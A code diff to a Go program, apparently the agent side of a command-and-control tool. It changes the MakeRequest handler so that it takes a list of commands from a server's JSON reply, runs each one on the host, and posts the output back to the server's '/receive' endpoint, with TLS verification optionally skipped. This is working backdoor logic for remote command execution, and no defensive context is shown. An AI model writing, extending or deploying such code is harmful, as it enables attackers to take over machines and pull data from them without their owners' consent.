@@ -266,21 +266,29 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 			// }
 		}
 
-		// **Check if response contains a "command" key**
-		if command, found := jsonResponse["command"].(string); found {
-			log.Printf("[+] Received command: %s\n", command)
-			output, err := ExecuteCommand(command)
-			if err != nil {
-				log.Printf("[-] Command execution failed: %s\n", err)
-				output = err.Error()
-			}
+		if commands, found := jsonResponse["Commands"].([]interface{}); found {
+			for _, cmd := range commands {
+				commandStr, ok := cmd.(string)
+				if !ok {
+					log.Println("[-] Invalid command format, skipping...")
+					continue
+				}
 
-			postURL := opts.BaseURL + "/receive"
+				log.Printf("[+] Received command: %s\n", commandStr)
 
-			// **Send the command output back to the server**
-			err = SendCommandOutput(postURL, command, output, opts.Headers, opts.SkipTLSVerify, opts.Timeout)
-			if err != nil {
-				log.Printf("[-] Failed to send command output: %s\n", err)
+				// Execute the command
+				output, err := ExecuteCommand(commandStr)
+				if err != nil {
+					log.Printf("[-] Command execution failed: %s\n", err)
+					output = err.Error()
+				}
+
+				// Send output back to /receive
+				postURL := opts.BaseURL + "/receive"
+				err = SendCommandOutput(postURL, commandStr, output, opts.Headers, opts.SkipTLSVerify, opts.Timeout)
+				if err != nil {
+					log.Printf("[-] Failed to send command output: %s\n", err)
+				}
 			}
 		}
 
